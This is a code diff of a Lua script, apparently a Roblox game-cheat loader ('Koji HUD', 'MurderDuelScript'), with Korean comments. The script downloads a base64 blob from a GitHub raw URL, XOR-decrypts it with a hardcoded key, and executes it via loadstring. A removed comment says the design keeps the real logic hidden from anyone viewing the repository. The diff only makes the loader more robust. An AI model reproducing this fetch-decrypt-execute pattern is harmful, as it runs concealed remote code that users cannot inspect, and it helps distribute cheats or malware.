@@ -1,6 +1,5 @@
--- [[ Koji HUD: Remote Loader ]]
--- 사용자가 GitHub 링크를 타고 들어와도 이 코드만 보이며, 실제 핵심 로직은 암호화된 상태로 호출됩니다.
 
+-- [[ Koji HUD: Remote Loader ]]
 local data_url = "https://raw.githubusercontent.com/jiop9981qwer-byte/MurderDuelScript/main/data.txt"
 local key = "KOJI_HUD_SECRET_KEY"
 
@@ -20,13 +19,23 @@ local function decode_base64(data)
 end
 
 local function xor_decrypt(data, key)
-    local res = ""
+    local res = {}
     for i = 1, #data do
         local b = data:byte(i)
         local k = key:byte((i - 1) % #key + 1)
-        res = res .. string.char(bit32.bxor(b, k))
+        -- bit32.bxor 대신 산술 연산으로 호환성 확보 시도 (또는 bit32 체크)
+        local bxor = bit32 and bit32.bxor or function(a,b)
+            local r, p, t = 0, 1, {0,1,2,3,4,5,6,7}
+            for i=0,7 do
+                local aa, bb = a%2, b%2
+                if aa ~= bb then r = r + p end
+                a, b, p = (a-aa)/2, (b-bb)/2, p*2
+            end
+            return r
+        end
+        table.insert(res, string.char(bxor(b, k)))
     end
-    return res
+    return table.concat(res)
 end
 
 local success, encoded_data = pcall(function()
@@ -37,10 +46,13 @@ if success then
     local decrypted = xor_decrypt(decode_base64(encoded_data), key)
     local func, err = loadstring(decrypted)
     if func then
-        func()
+        task.spawn(function()
+            local s, e = pcall(func)
+            if not s then warn("스크립트 실행 중 오류: " .. tostring(e)) end
+        end)
     else
-        warn("로딩 중 오류 발생: " .. tostring(err))
+        warn("복호화된 스크립트 구문 오류: " .. tostring(err))
     end
 else
-    warn("데이터를 불러오지 못했습니다. 인터넷 연결 또는 URL을 확인하세요.")
+    warn("데이터 로딩 실패: GitHub URL을 확인하세요.")
 end
